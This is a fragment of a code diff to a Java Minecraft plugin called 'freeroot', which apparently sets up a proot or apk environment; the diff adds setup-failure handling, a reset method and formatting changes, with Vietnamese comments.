-                    getLogger().info(colorize("&a[+] Proot environment setup completed!"));
+                    getLogger().info(colorize("&a[+] Apk environment setup completed!"));
                 }
             }
 
@@ -885,10 +1026,24 @@ public class freeroot extends JavaPlugin implements Listener {
                 getLogger().warning(colorize("&c[-] Setup failed: " + e.getMessage()));
                 e.printStackTrace();
             }
+            // [FIX 21] Đặt setupFailed để không retry vô hạn khi exception
+            setupFailed = true;
         } finally {
             isInitializing = false;
         }
     }
+
+    // [FIX 22] Thêm /root reset để có thể retry setup sau khi fail
+    // Đã xử lý trong onCommand: userLogs.remove, userWorkingDir.remove, userEnvironment.remove
+    // Thêm reset setupFailed để có thể thử lại
+    private void resetSetup() {
+        synchronized (this) {
+            isInitialized = false;
+            isInitializing = false;
+            setupFailed = false;
+        }
+    }
+
     private void deleteDirectory(File dir) {
         if (dir.isDirectory()) {
             File[] files = dir.listFiles();
@@ -900,6 +1055,7 @@ public class freeroot extends JavaPlugin implements Listener {
         }
         dir.delete();
     }
+
     private String escapeForShell(String command) {
         return "'" + command.replace("'", "'\\''") + "'";
     }
